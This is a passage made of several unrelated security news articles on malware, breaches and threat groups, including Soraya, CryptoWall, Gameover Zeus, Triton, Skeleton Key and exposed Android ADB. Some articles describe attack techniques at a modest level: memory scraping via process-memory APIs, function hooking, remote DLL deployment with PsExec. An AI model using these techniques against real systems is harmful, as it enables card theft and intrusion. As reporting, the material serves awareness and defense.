credit card data,\" the researchers continued. \"It does this by creating the mutex POSMainMutex to ensure it is the only thread operating.\" Every five seconds, the thread will iterate through the list of processes with Process32Next() while setting side certain system processes, the researchers explained. It will also check memory regions for every process with VirtualQueryEx(), ignoring those with the PAGE_NOACCESS or PAGE_GUARD values set, and then copy valid memory regions with ReadProcessMemory() and examine them for payment card data. The Dexter malware family uses a similar technique, the researchers noted. \"After injecting itself, Soraya will check if the new process is a Web browser by locating several unique DLLs,\" the researchers blogged. \"The functions targeted are those responsible for sending POST data, which are intercepted and sent to the C2 as a 'mode 4' message…All POST data is captured, not just payment card information.\" \"Soraya hooks these functions by overwriting the function prologue with the instructions PUSH and RET, essentially providing a new saved return address and returning to it,\" they blogged.   \"Soraya has clearly taken inspiration from the Dexter and the Zeus families,\" they added. \"The 'split brain' functionality of both memory scraping and form grabbing is Soraya’s most unique trait. In past campaigns, memory scrapers have been uniquely targeted at point-of-sale devices and form grabbers have been uniquely targeted at online bank users.\" *Mike Lennon contributed to this article.

This is the second data breach discovered by the company within a period of two years. The incident affects three hotels in the United States (all in Hawaii), three in Puerto Rico, 18 in China, four in Mexico, three in Saudi Arabia, three in South Korea, and one each in Brazil, Colombia, Guam, India, Indonesia, Japan and Malaysia. According to Hyatt, malware planted by cybercriminals on certain hotel IT systems harvested information from payment cards manually entered or swiped at some hotel front desks between March 18, 2017 and July 2, 2017. The malware was designed to steal data such as cardholder name, card number, expiration date, and internal verification code. No other information appears to have been compromised. “While we estimate that the incident affected a small percentage of payment cards used by guests who visited the group of affected Hyatt hotels during the at-risk time period, the available information and data does not allow Hyatt to identify each specific payment card that may have been affected,” said Chuck Floyd, global president of operations at Hyatt Hotels Corporation. Back in 2015, Hyatt suffered a payment card breach that affected 250 of its hotels worldwide. The company claimed at the time that it had strengthened the security of its systems. “Our enhanced cybersecurity measures and additional layers of defense implemented over time helped to identify and resolve the issue,” Floyd said this week. However, the company’s enhanced security measures were obviously not enough, given that hackers had access to its systems for well over three months. “The harvested customer payment card data – including expiration dates and verification codes - is extremely valuable data that will be sold on the Dark Web or used in credit card cycling scams. It’s also easily combined with other stolen data to build entirely new synthetic personas for all manner of fraud,” explained Lisa Baergen, marketing director at NuData Security. “The travel and leisure industry – like so many consumer-facing sectors - has time and again shown itself extremely vulnerable to breaches,” Baergen added. “This latest concerning breach is just one more reason why companies such as Hyatt must adopt more advanced security and authentication measures based on trusted identity, and consumers must diligently, routinely check their credit files for suspicious credit applications and consider freezing their credit profiles.” " }

ADB is a feature meant to provide developers with the ability to easily communicate with devices remotely, to execute commands and fully control the device. Because it doesn’t require authentication, ADB allows anyone to connect to a device, install apps and execute commands. In theory, the device should be first connected via USB to enable ADB, but Beaumont has discovered that some vendors ship Android devices with the feature enabled right from the start. The Debug Bridge listens on port 5555, and anyone can connect to the device over the Internet. “During research for this article, we’ve found everything from tankers in the US to DVRs in Hong Kong to mobile telephones in South Korea. As an example, a specific Android TV device was also found to ship in this condition,” the security researcher notes. This is clearly a major issue, as anyone can remotely access devices with ADB enabled and, without any password but with root privileges, can silently install software and execute malicious functions. The issue is not related to ADB itself, as it wasn’t designed to be deployed in this manner, but with devices having the feature enabled. Furthermore, root access should not be available in non-development builds, but this can be bypassed on some devices, not to mention that some users enabled root on their own. To make matters worse, the security researcher also discovered a worm taking advantage of this security slip and attempting to infect devices via ADB. Starting February 1, there was a massive increase in scans for TCP port 5555 (the Android Debug Bridge port), with “nearly ten thousand unique IP addresses scanning in any 24 hour window.” There are over a hundred thousand IP addresses scanning each 30 days, but the security researcher couldn’t determine the exact number of infected devices. “These devices are currently being used for cryptocurrency mining, where computing resources is misused without the owner’s permission to generate profits for criminals,” Beaumont notes. Qihoo 360’s Netlab issued a warning on the matter on February 4, but the problem continued to grow, mostly in Asia. Analysis of the worm revealed it is spreading using a modified version of Mirai’s code, leveraging the official Android ADB tools. It lacks a command and control (C&C) server and moves peer-to-peer via port 5555. Because of various bugs in its code, the malware only works on certain types of devices. The issue, however, is larger than a simple botnet abusing devices for cryptocurrency mining. The fact that the impacted devices ship misconfigured is the actual problem, especially with some of them used in corporate environments. “If somebody wanted to, they could run something other than cryptocurrency mining — which could develop into a serious issue,” Beaumont points out. Searching for devices listening to port 5555 and filtering the results using Metasploit’s module adb_server_exec, the researcher discovered over 80,000 devices residing in China alone. “It’s very clear through digging through data and feeds that a huge number of misconfigured devices exist, hence all the scanning for port 5555,” the researcher notes. According to Beaumont, vendors should make sure they do not ship products with ADB enabled over a network, especially on devices designed to stay connected to the Internet, as these devices remain exposed and can be misused, while also placing users in harm’s way. Vendors are also advised to release updates to correct the issue. " }

Threats against Apple’s computers have been steadily increasing over the past four years, Symantec’s Dick O'Brien noted in a recent blog post. The growth started in 2010, but started to spike in the recent years, reaching 29 percent in 2012, 44 percent in 2013, and hitting 15 percent in 2014.  In 2015 to date, however, the number of newly detected Mac OS X threats has seen a decrease, despite the fact that more and more Macs are being infected. The number of infections started to increase in June of last year and peaked in March 2015, O'Brien said. After a steady decrease until July, the infections went up again in August.  According to Symantec, the increase in infections is based mainly on “grayware”, including adware, potentially unwanted or misleading applications. These grayware infections accounted for the surge between June 2014 and March 2015, but other forms of malware started to appear in the infections observed over the past few months, O'Brien says While the grayware malware features high prevalence, infections usually have a smaller impact, unlike other forms of malware, such as backdoors, infostealers, and Trojans, which have low prevalence by very high impact. By using more sophisticated malware, attackers can gain remote access to Macs, can steal sensitive information, including banking credentials, and can also encrypt data on infected machines and demand ransom to decrypt it.  iOS devices are also becoming a target for cybercriminals, and 2015 marks a new high in threats discovered for the platform, although the number of such threats remains very small at just 7, Symantec said. The main issue is the fact that attackers have few methods of installing malware on iOS devices. Some malware infects iOS devices when they are connected to compromised desktops, but attackers also target jailbroken devices, since their users have access to third-party app stores and the systems has fewer application control policies in place. According to Symantec, 9 of the 13 iOS threats it has documented to date are aimed only at jailbroken devices.  The security firm notes that jailbroken devices are at high risk when installing apps from third-party stores, as they might include backdoors or other malware. iOS devices are also vulnerable to applications coming from unverified sources, and the XcodeGhost malware designed to inject malicious code into both iOS and Mac OS X applications is proof of that. When it comes to Mac OS X vulnerabilities, Symantec notes that the number of newly discovered ones remains steady at between 39 and 70 per year. The number of new Mac vulnerabilities is usually lower than that of new Windows ones, mainly because Microsoft’s OS has a larger market share, which makes it the primary target for both researchers and cybercriminals.  The number of iOS vulnerabilities found each year has been growing steadily, exceeding those documented for Android between 2011 and 2014. This year, however, the number of new vulnerabilities discovered for Android has exceeded those found on iOS. Security researchers, however, have started to focus on iOS vulnerabilities, and recently announced $1 million bounty programs should determine them to accelerate work on the matter.  “Although still small in terms of overall numbers, the number of new OS X and iOS threats discovered annually has been trending upwards over the past five years. Given this trend, Apple users cannot be complacent about security. Awareness of common threats combined with properly securing Apple devices should minimize the risk of infection,” O’Brian says. To stay protected, users should install robust security suites and keep them updated, should also keep the operating system up-to-date, and should avoid jailbreaking devices. They should also install applications from reputable sources only, and should not open suspicious emails or attachments they receive, to avoid falling victims to phishing attacks. " }

According to F-Secure, which hasn’t found any links between this and other known threat actors, the Callisto group has been active since at least October 2015. The hackers have been observed targeting various individuals and organizations in Eastern Europe and the South Caucasus region, which encompases Georgia, Armenia and Azerbaijan. In late 2015, when F-Secure started tracking Callisto, the group had sent out highly targeted Gmail phishing emails. Some of the messages were sent to personal email addresses, suggesting that the attackers had previously conducted reconnaissance. Experts believe the hackers managed to hijack some accounts and used them to send phishing emails to other targets. In early 2016, the cyberspies sent spear-phishing emails carrying malicious documents to military and government officials, think tank employees and journalists. F-Secure is aware of the malicious emails sent to these individuals, but it’s unclear if the targets actually installed the malware on their systems. The Word documents sent to targets embedded a piece of malware as an object, eliminating the need for using exploits. If recipients clicked on the document and allowed the package content to run when prompted, the malware would be executed. The malware has been identified as Scout, one of the tools available in the RCS Galileo platform of Italian spyware maker Hacking Team. The company was hacked back in 2015 and many of its tools were leaked online. Researchers determined that the Callisto group used the installers that had been leaked at the time, rather than relying on the Galileo source code. The Scout malware has been described as a light backdoor that can be used for reconnaissance and to install other malware on the infected system. F-Secure’s analysis revealed that the Callisto group’s infrastructure had been linked to servers hosting stores that sell controlled substances, which suggests a possible cybercrime connection. Experts also discovered links between the infrastructure used by the threat actor and countries such as Russia, Ukraine and China. “A cyber crime group with ties to a nation state, such as acting on behalf of or for the benefit of a government agency, is one potential explanation,” researchers said in their report. “However, we do not believe it is possible to make any definitive assertions regarding the nature or affiliation of the Callisto Group based on the currently available information.” While F-Secure has not seen any Callisto attacks involving malware for more than a year, the security firm says the group is still active, with new phishing infrastructure set up every week. It’s worth pointing out that the Russia-linked threat actor dubbed APT28, Pawn Storm and Fancy Bear has also been known to target entities in Eastern Europe and the Caucasus region. " }

Almost two months have passed since the developers of CryptoWall released an updated version of the threat, but now they’re back to work. The malware, distributed via spam and malvertising campaigns, helped cybercriminals make a lot of money last year so it’s not surprising that its authors continue improving it. According to Microsoft, which detects the threat as Win32/Crowti, there aren’t any major differences between CryptoWall 3.0 and the previous variant. The malware exhibits the same behavior and the instructions on how to recover the files are still only accessible over the Tor anonymity network. The company noted, however, that the names of the files containing the ransom demand have been changed to “HELP_DECRYPT.” On January 12, Microsoft identified 288 unique devices infected with the latest version of the threat. Victims of the ransomware are given 168 hours (7 days) to pay $500 in Bitcoins if they want to recover their files. After the 7-day deadline, the amount increases to $1,000. The French researcher who uses the online moniker Kafeine has also analyzed CryptoWall 3.0. The expert says the threat’s command and control (C&C) communications are encoded with the RC4 cipher. An interesting feature of CryptoWall 3.0 is the use of I2P (Invisible Internet Project) for C&C communications. I2P is an anonymity network that is similar to Tor, but there are some important differences between the two. “The two primary differences between Tor / Onion-Routing and I2P are related to differences in the threat model and the out-proxy design (though Tor supports hidden services as well). In addition, Tor takes the directory-based approach - providing a centralized point to manage the overall 'view' of the network, as well as gather and report statistics, as opposed to I2P's distributed network database and peer selection,” the I2P Project explains on its website. A recently launched online drug bazaar called Silk Road Reloaded uses I2P to protect its infrastructure and the identity of its customers. According to Kafeine, CryptoWall 3.0 is the first CryptoWall variant that uses I2P. The researcher told SecurityWeek that the malware developers seem to be chaining Tor and I2P for the file decryption services. Sources told SecurityWeek that the computers of a government organization in Romania have been infected with the new CryptoWall. A large number of important documents have been encrypted as a result of the infection. Researchers at Cisco have conducted an in-depth analysis of CryptoWall 2.0 and determined that the threat is capable of executing 64-bit code directly from its 32-bit dropper. Crypto-ransomware is the “weapon” of choice for many cybercriminals. Trend Micro reported earlier this week that the TorrentLocker ransomware had helped cybercriminals make 810 BTC ($220,000) in a single month last year. " }

A federal grand jury in Pittsburgh has hit Evgeniy Mikhailovich Bogachev, 30, of Anapa, Russian Federation, with a 14-count indictment in connection with his alleged role as the administrator of the Gameover Zeus botnet. The indictment charges him with conspiracy, computer hacking, wire fraud, bank fraud and money laundering. He was also charged with bank fraud in Omaha in relation to his involvement with another Zeus variant known as 'Jabber Zeus.' A separate civil injunction application filed by the U.S. in federal court in Pittsburgh accuses Bogachev of being the leader of a cyber-gang based in Russia and Ukraine that is responsible for both Gameover Zeus and Cryptolocker, a notorious piece of ransomware that has been spread by the Gameover Zeus network. The moves are the result of an international investigation that involved the FBI, Europol and a number of software companies including Microsoft, Dell SecureWorks and CrowdStrike. \"GameOver Zeus is spread through drive-by downloads, where the cybercriminals create a website that downloads malware onto any unprotected computer that visits that site,\" blogged Richard Domingues Boscovich, assistant general counsel for Microsoft's Digital Crimes Unit. \"It is also distributed through the Cutwail spam botnet via phishing, where cybercriminals send counterfeit emails that appear to be legitimate communications from well-known businesses and organizations.\" \"The botnet automatically begins key logging when a user of an infected computer types into the Web browser, unwittingly giving cybercriminals access to passwords and private account information,\" he added. \"The infected computer sends stolen data to the botnet’s C&C server, and stores it there for later use by the criminal.\" Since its appearance 2011, Gameover has gone through a number of adaptations meant to make it more lethal, including the addition of a peer-to-peer component. Earlier this year, the malware was updated with a low-level driver designed to stop the malware from being easily removed and to thwart efforts at killing the Gameover process. According to Dell SecureWorks, the Gameover Zeus was the most prevalent piece of banking malware detected by the company in 2013. That particular Trojan represented 38 percent of the company's detections last year. The effort to dismantle Gameover Zeus also hit Cryptolocker, which began appearing about September 2013. According to the U.S. Department of Justice, security researchers have estimated that as of April 2014, the ransomware had infected more than 234,000 machines, approximately half of which are in the United States. \"This operation disrupted a global botnet that had stolen millions from businesses and consumers as well as a complex ransomware scheme that secretly encrypted hard drives and then demanded payments for giving users access to their own files and data,\" said Deputy Attorney General James M. Cole. \"We succeeded in disabling Gameover Zeus and Cryptolocker only because we blended innovative legal and technical tactics with traditional law enforcement tools and developed strong working relationships with private industry experts and law enforcement counterparts in more than 10 countries around the world.\" \"The ultimate goal of the law enforcement activity is to prevent infected computers from communicating with one another, significantly weakening the criminal infrastructure,\" blogged Rik Ferguson of Trend Micro. \"While this blow is effective, it is not permanent and we expect the malicious networks to return to their former strength within…weeks, if not days.\" \"This truly global operation has seen coordinated activities aimed at taking over or disrupting elements of the Command & Control infrastructure used to spread these pernicious malware families, but we cannot achieve this goal alone, every computer user has their own role to play,\" he added.

Triton, also known as Trisis and HatMan, was discovered in August 2017 after a threat group linked by some to Iran used it against a critical infrastructure organization in the Middle East. The malware targets Schneider Electric’s Triconex Safety Instrumented System (SIS) controllers, which use the proprietary TriStation network protocol. The malware leveraged a zero-day vulnerability affecting older versions of the product. FireEye’s Advanced Practices Team has conducted a detailed analysis of the threat, which it describes as a malware framework, in an effort to determine when and how it was created. The TriStation protocol is designed for communications between PCs (e.g. engineering workstations) and Triconex controllers. With no public documentation available, the protocol is not easy to understand, but it has been implemented by Schneider through the TriStation 1131 software suite. It’s unclear how the attackers obtained the hardware and software they used to test the malware. They may have purchased it or borrowed it from a government-owned utility. The software could have also been stolen from ICS companies or other organizations that use Triconex controllers. FireEye believes, however, that the malware developers did not build the TriStation communications component from the ground up. The company’s analysis suggests that the hackers copied code from legitimate libraries. Specifically, researchers discovered significant similarities between the code found in the malware and code in a legitimate TriStation software file named “tr1com40.dll.” While reverse engineering the legitimate DLL file may have helped them understand how TriStation works, the code in the malware suggests it did not answer all their questions. This may have led to the problems experienced by the threat group during its attack on the critical infrastructure organization. Triton was discovered after it accidentally caused SIS controllers to initiate a safe shutdown. Experts believe the attackers had been conducting tests, trying to determine how they could cause physical damage. Learn More at SecurityWeek's 2018 ICS Cyber Security Conference “Seeing Triconex systems targeted with malicious intent was new to the world six months ago. Moving forward it would be reasonable to anticipate additional frameworks, such as TRITON, designed for usage against other SIS controllers and associated technologies,” FireEye said in its report. “If Triconex was within scope, we may see similar attacker methodologies affecting the dominant industrial safety technologies.” Industrial cybersecurity firm Dragos reported recently that the threat group behind the Triton attack, which it tracks as Xenotime, is still active, targeting organizations worldwide and safety systems other than Schneider’s Triconex.

Independent security analyst Randy Abrams noticed recently that an Equifax service designed for obtaining free and discounted credit reports had been redirecting users to a website set up to serve adware disguised as a Flash Player installer. While initially it appeared that Equifax’s website had been hacked, the company’s investigation revealed that the malicious redirects occurred due to a third-party vendor’s script. “Despite early media reports, Equifax can confirm that its systems were not compromised and that the reported issue did not affect our consumer online dispute portal,” Equifax stated.  The redirection chain, often seen in malvertising attacks, results in users being taken to a scammy or malicious website, depending on their geographical location and the type of device they use to access the affected webpage. Researchers at Malwarebytes have analyzed the incident and determined that the redirection occurs due to a web analytics script associated with Fireclick, a now-defunct platform formerly operated by Digital River. A search for the script involved in the attack (fireclick.js) revealed that it had also been used on the Central America website of TransUnion, whose customers were also redirected to shady sites. Both Equifax and TransUnion have removed the problematic script from their websites. Equifax took the affected service offline and had not restored it at the time of writing. “The issue involves a third-party vendor that Equifax uses to collect website performance data, and that vendor’s code running on an Equifax website was serving malicious content. Since we learned of the issue, the vendor’s code was removed from the webpage and we have taken the webpage offline to conduct further analysis,” an Equifax spokesperson explained. In addition to adware, Malwarebytes said the redirection chain also took users to fake surveys and even the RIG exploit kit, which is typically leveraged to deliver ransomware and other malware. The security firm found the same Fireclick script on several other websites as well. “Many websites include javascript from third parties for a variety of purposes, including analytics, ads, styling, and many other webpage features. Equifax included this Fireclick library on their own website, but it pulls in some javascript from another site, netflame.cc, that appears to have been hacked. When the Equifax site loads Fireclick, which loads netflame.cc code, the victim’s browser is redirected to malware,” explained Jeff Williams, CTO and co-founder of Contrast Security. “Anyone using the Fireclick library may have been affected, and the attackers may not even know that they compromised Equifax. A more targeted attack could have used the netflame.cc code to access victim’s data from the Equifax page, submit false data on behalf of the victim, or deface the Equifax page. The attack could have been made invisible to the victim and could have been much more difficult to detect,” Williams added. Some Hacker News users noticed that the netflame.cc domain was owned by Digital River until November 2016, when the registration information changed to show that the new owner was an individual from Thailand.  “In July 2016, Digital River fully decommissioned the Fireclick platform, which rendered the application inoperable. As part of our decommissioning Fireclick, we no longer had a business use for the netflame.cc domain and released it back to the domain name marketplace in October 2016, which is a common practice in the industry,” Digital River told SecurityWeek. “At that point, the domain name was available for anyone to purchase. As such, Digital River’s connection to Fireclick and this domain name ended before this Equifax event.” *Updated with clarifications and statement from Digital River " }

As threats designed to target Apple devices become more common — recent examples include XcodeGhost and WireLurker —, researchers may want to analyze the behavior of OS X files that look suspicious. Sandbox execution was first introduced by VirusTotal in 2012 for Windows PE files and the feature was expanded in 2013 to include Android applications (APKs). Now, users will also be able to view behavioral reports when scanning Mach-O and DMG files and ZIP archives containing a Mac application. VirusTotal has pointed out that Mac files will be executed in a sandbox regardless of the scan method being used — behavioral reports are produced for files scanned via virustotal.com, the OS X Uploader utility, or the API. The new “Behavioural information” tab introduced for OS X file scans provides a report on the actions and events performed by the targeted file or by the processes it launches or injects. The information includes a list of opened, read, moved and written files, created processes, HTTP and DNS requests, and TCP connections. The malware scanning service has provided example reports for DMG files, Mach-O files, and ZIP archives containing a Mac app. Customers with “allinfo” or private API privileges will see the behavior information in the API responses. The information is indexed and searchable for customers of VirusTotal Intelligence, the premium service that offers advanced features. When it launched the sandbox execution feature in 2012, VirusTotal noted that its goal is not to replace existing online sandboxes, but to provide complementary reports that will further help the security community. Earlier this year, the service announced the launch of a project dubbed “Trusted Source,” designed to allow major software developers to share their files in order to ensure that antivirus products don’t erroneously flag them as malicious.

Based on an analysis of the files, Symantec is fairly confident that some of the Vault 7 documents describe the tools and techniques used by Longhorn. According to the security firm, Longhorn is a threat group that has been around since at least 2011, but possibly as early as 2007. Symantec has been tracking the APT since 2014, when it used a Windows zero-day exploit (CVE-2014-4148) to deliver a backdoor called Plexor. Researchers have observed Longhorn attacks aimed at more than 40 targets across 16 different countries in Europe, Asia (Middle East and other regions) and Africa. The list of targets includes governments, international organizations, and companies in the telecoms, financial, aerospace, energy, IT, education, and national resources sectors. Symantec pointed out that all of the targeted entities could present an interest to a nation-state actor. An analysis of Longhorn’s tools and working hours suggests that the group is located in North America and its members are English speakers. The CIA has neither confirmed nor denied that the Vault 7 files are authentic. The agency said its mission is to collect foreign intelligence from overseas entities, and pointed out that it is legally prohibited from spying on Americans. Symantec noted that it did detect one Longhorn malware infection in the United States, but an uninstaller was launched within hours, which could indicate that the computer had been infected unintentionally. In addition to Plexor, Longhorn has used several other pieces of malware in its operations, including Trojans dubbed Corentry, LH1 and LH2. Corentry’s development timeline coincides with the dates mentioned in a changelog file published by WikiLeaks for a tool called Fluxwire. Experts also determined that the Plexor backdoor is very similar to a tool named in the Vault 7 documents “Fire and Forget.” Researchers also found similarities between the cryptographic protocols described in the Vault 7 files and the ones used by Longhorn. “Other Vault 7 documents outline tradecraft practices to be used, such as use of the Real-time Transport Protocol (RTP) as a means of command and control (C&C) communications, employing wipe-on-use as standard practice, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and the use of secure erase protocols involving renaming and overwriting. Symantec has observed Longhorn tools following all of these practices,” the security firm said in a blog post. If confirmed, Longhorn would be the second cyber espionage group whose activities have been tied to the U.S. government. The first was the NSA-linked Equation Group, whose mistakes were analyzed by the individuals who developed the Vault 7 tools. Lamberts toolkit analyzed by Kaspersky Kaspersky has also tracked this group since 2014, when it used the CVE-2014-4148 zero-day vulnerability to deliver malware. The security firm tracks the threat actor as “The Lamberts,” and it has identified several of its tools. The security firm has tracked the earliest malware family used by the group as Green Lambert. This piece of malware had been leveraged since at least 2008 and up until 2014, when researchers stumbled upon the Windows zero-day attacks. Green Lambert also has an OS X version. Other malware families used by The Lamberts are tracked by Kaspersky as White Lambert, Black Lambert, Blue Lambert, Pink Lambert and Gray Lambert. *Updated with information from Kaspersky " }

Dubbed 'Skeleton Key', the researchers found the malware on a client network that used single-factor authentication for access to webmail and VPN – giving the threat actor total access to remote access services. According to CTU, the malware requires an attacker have domain administrator credentials in order to be deployed, and has been observed being used by attackers who have stolen credentials from critical servers, administrators' workstations and the targeted domain controllers. \"What raises the alarm about the Skeleton Key malware is that it enables the adversary to trivially authenticate as any user, using their injected password, this could give them access to the target’s webmail or VPN if that was relying upon AD for authentication,\" said Don Smith, CTU director of technology. \"Consequently, the threat actors can get access to the victim’s email correspondence and network files. This activity looks like - and is - normal end user activity, so the chances of the threat actor raising any suspicion is extremely low and this is what makes this malware particularly stealthy.\" According to Dell SecureWorks, Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers. The only known Skeleton Key samples lack persistence and must be redeployed when a domain controller is restarted. \"CTU researchers suspect that threat actors can only identify a restart based on their inability to successfully authenticate using the bypass, as no other malware was detected on the domain controllers,\" according to the company. \"Between eight hours and eight days of a restart, threat actors used other remote access malware already deployed on the victim's network to redeploy Skeleton Key on the domain controllers.\" The attackers use the PsExec tool to run the Skeleton Key DLL remotely on the target domain controllers using the rundll32 command. The malware does not transmit network traffic, making network-based detection ineffective, the researchers noted. However, the malware has been implicated in domain replication issues that may be proof of an infection. \"Shortly after each deployment of the Skeleton Key malware observed by CTU researchers, domain controllers experienced replication issues that could not be explained or addressed by Microsoft support and eventually required a reboot to resolve,\" CTU researchers blogged. \"These reboots removed Skeleton Key's authentication bypass because the malware does not have a persistence mechanism.\" Dell SecureWorks recommends organizations use multi-factor authentication for all remote access solutions, monitor Windows Service Control Manager events on Active Directory domain controllers and be mindful that process creation audit trails on workstations and servers, including AD domain controllers, may detect Skeleton Key deployments. \"Modification of the authentication process is rarely observed in the Windows world, and the CTU has not seen similar malware targeting Active Directory before,\" Smith said. \"The hackers behind the Skeleton Key malware would definitely require a reasonable degree of skill.\" " }

The recent attacks reuse the same command and control infrastructure and tactics as previous attacks, according to FireEye. Among the victims: government departments in countries such as Israel, Slovenia and the U.S.; the British Broadcasting Corporation (BBC); and the Office of the Quarter Representative. \"Previous Molerats campaigns have used several garden-variety, freely available backdoors such as CyberGate and Bifrost, but, most recently, we have observed them making use of the PIVY (Poison Ivy) and Xtreme RATs,\" according to FireEye. \"Previous campaigns made use of at least one of three observed forged Microsoft certificates, allowing security researchers to accurately tie together separate attacks even if the attacks used different backdoors. There also appears to be a habitual use of lures or decoy documents – in either English or Arabic-language – with content focusing on active conflicts in the Middle East. The lures come packaged with malicious files that drop the Molerats’ flavor of the week, which happen to all be Xtreme RAT binaries in these most recent campaigns.\" The means of the attack varied somewhat. In at least one example, the attackers used a spearphishing email with a malicious link. In other cases, the emails contained malicious attachments. Hacking activities in the Middle East have been on the rise for the past few years. Just recently, Iranian attackers developed more than a dozen fake identities on social networking sites such as Facebook and Twitter as part of a cyber-espionage effort that began in 2011. Using the phony identities, the attackers were able to successfully connect to more than 2,000 individuals. Earlier this year, researchers at Symantec noted that the njRAT remote access tool is gaining popularity among attacker groups in the Middle East. The tool, which has been publicly available since June 2013, is developed and supported by Arabic speakers and is capable of downloading and executing additional malware, logging keystrokes and taking other actions. It spreads using infected USB keys and networked drives. The Molerats activity goes back a few years, and was spotted in 2012 using the XtremeRAT and PoisonIvy malware. \"Although a large number of attacks against our customers appear to originate from China, we are tracking lesser-known actors also targeting the same firms,\" according to FireEye. \"Molerats campaigns seem to be limited to only using freely available malware; however, their growing list of targets and increasingly evolving techniques in subsequent campaigns are certainly noteworthy.\" " }

The study is based on a survey of more than 1,100 organizations of all sizes from North America, Europe, Africa and the Middle East. Nearly two-thirds of respondents said they are using Office 365 and 49% of the remaining organizations plan on migrating. While the number of organizations that started using Office 365 has increased, the adoption rate has declined compared to 2015-2016, when the number of subscriptions doubled. Nearly 44% of organizations that haven’t moved to Office 365 decided against migrating due to security concerns. Of the companies that plan on migrating, more than 73% said they were concerned about advanced threats in their future Office 365 environment. Nearly 70% of those that have already started using Office 365 are also concerned about sophisticated threats. More than 86% of respondents are concerned about phishing, impersonation and social engineering attacks, while 92% are concerned about ransomware. “The very high rates of concern about security—including worries about latent threats, advanced malware, phishing and spear phishing, and especially ransomware—may be the single most important contributing factor to the overall decline in the rate of adoption that the survey revealed,” Barracuda said in its report. How well are these organizations prepared to handle potential attacks? Only one-third of respondents said they have a third-party security solution designed to protect them against phishing and other social engineering attacks, and 69% said they provide training for their employees. Despite the fact that email has been one of the main ransomware delivery vectors, more than half of respondents don’t use DMARC or DKIM/SPF, protocols designed to detect and prevent email spoofing. Microsoft offers its own security service for Office 365, Advanced Threat Protection (ATP), but only 15% of respondents said they use it. On the other hand, many are either using or are planning on using third-party solutions for Office 365 security, archiving and backup.  “Overall, respondents reported significant doubts about the effectiveness of native security and other features of Office 365. In particular, they had concerns about these features’ ability to protect them effectively against ransomware, phishing, and spear-phishing or social-engineering attacks,” Barracuda said. In the past months, there have been several reports of serious vulnerabilities affecting Office 365 and even sophisticated attacks targeting users of the platform. " }

Dubbed RedEye, the malware appears to be the creation of the developer behind the Annabelle ransomware, who also claims to have made the JigSaw ransomware that first emerged a couple of years back (Cisco says the individual might be responsible for several other families as well). The same as Anabelle and JigSaw, RedEye’s destructive nature makes it stand out in the crowd. While the vast majority of ransomware families out there have been created with the purpose of generating revenue for their authors and operators, RedEye would gladly destroy users’ files even if there’s no financial gain in it. The new threat, Bart Blaze discovered, has a large file size, at 35.0 MB. This is the result of several media files (images and audio files) being embedded in the binary. Among these, there are three .wav files (child.wav, redeye.wav, and suicide.wav) meant to play a creepy sound, intended to scare the victim. The malware author also used ConfuserEx and compression, along with a few other tricks, to protect the binary. A second binary was also embedded in the file, capable of replacing the MBR (Master Boot Record). Once it has infected a computer, the ransomware performs a series of actions to make removal a difficult process. The threat disables task manager and also hides the victim machine’s drives. RedEye then displays a ransom note informing victims that their files have been encrypted using AES256 and that they should access an .onion website and pay 0.1 Bitcoins to a specified address. This would supposedly result in a decryption key being delivered to them. The victim is required to pay the ransom in 4 days, and the malware claims to be able to “fully destroy” the computer after that period of time is over. Options available in the ransomware include the possibility to view encrypted files and decrypt them, get support, and “destroy PC.” If the last option is selected, a GIF is displayed in the background, with an option to proceed with the operation (a \"Do it\" button) and another to close the image. If “Do it” is selected, the same as when the 4-day window is over, the malware reboots the machine and replaces the MBR. Thus, when the victim powers on the system, they are greeted with a message informing them that “RedEye terminated their computer.” The malware author signed the message with the “iCoreX” handle. Blaze also notes that, despite claiming to have securely encrypted files with AES256, RedEye appears to actually “overwrite or fill files with 0 bytes,” thus rendering them useless. The malware also appends the .RedEye extension to the affected files. “While it appears that the RedEye ransomware has even more tricks up its sleeve than its predecessor Annabelle, the same conclusion holds true: do not pay the ransomware. As for the actual purpose of the ransomware: it may be considered a ransomware of the wiper kind, however, it appears the author likes to showcase his or her skill,” Blaze concludes. " }

According to Bitdefender, the most important change in the latest version of CryptoWall is that the threat doesn’t only encrypt the content of files, it also encrypts file names, which makes it nearly impossible for victims to recognize them. Another interesting change in CryptoWall 4.0 is the ransom note, which now tells victims that the “CryptoWall Project” is not malicious. Bitdefender has pointed out that the new message is longer, but less alarming, and with a hint of irony. “CryptoWall Project is not malicious and is not intended to harm a person and his/her information data. The project is conducted for the sole purpose of instruction in the field of information security, as well as certification of antivirus products for their suitability for data protection. Together we make the Internet a better and safer place,” the note reads. Researchers at Heimdal Security also spotted some improvements designed to help the malware avoid detection. The security firm says antivirus detection rates are currently very low. “CryptoWall 4.0 still includes advanced malware dropper mechanisms to avoid antivirus detection, but this new version possesses vastly improved communication capabilities. It includes a modified protocol that enables it to avoid being detected, even by 2nd generation enterprise firewall solutions,” Heimdal Security said in a blog post. “This lowers detection rates significantly compared to the already successful CryptoWall 3.0 attacks.” Bitdefender told SecurityWeek that it first spotted the new malware on Wednesday. The security firm is still trying to determine the number of infections, but researchers don’t expect to see a high number of incidents considering that the threat only emerged recently. The new version of the ransomware, which similar to previous versions has been distributed via spam emails, demands 1.83 Bitcoin, roughly $700, in return for the private key needed to decrypt the files. Victims are instructed to use the Tor anonymity network to pay the ransom. Also similar to previous versions, the Decrypt Service website is used to make the payments, get a status on a payment, and even create support requests. Bitdefender says users can also decrypt one file for free, but recovering the most valuable file might be tricky now that file names are encrypted as well. As for encryption, CryptoWall 4.0, like its predecessor, uses the RSA-2048 algorithm, which makes it nearly impossible to recover files without paying the cybercrooks. Bleeping Computer reports that CryptoWall 4.0 is also similar to the previous major version when it comes to the use of RC4 encryption for command and control (C&C) communications, fingerprinting the victim’s device, and disabling services that could be used to recover encrypted files. It’s worth pointing out that the new ransom note does not say the files have been encrypted by CryptoWall 4.0 like in the case of CryptoWall 3.0 — it simply says CryptoWall. Bitdefender told SecurityWeek that it assigned the \"4.0\" to signal a new version of the threat.  In a report released last week, the Cyber Threat Alliance revealed that a single entity is likely behind the many CryptoWall 3.0 campaigns. After analyzing the primary Bitcoin wallets used in these operations, researchers determined that the cybercriminals made more than $300 million. While in many cases it’s impossible to recover files without paying the ransom, sometimes victims get lucky, assuming that they hold on to the encrypted files long enough. Kaspersky Lab and Dutch authorities joined forces earlier this year in an effort to help the victims of CoinVault and Bitcryptor ransomware. The security firm announced last week that it had obtained all 14,000 decryption keys needed to recover encrypted files. *Updated with clarifications that attackers are not officially calling this CryptoWall 4.0 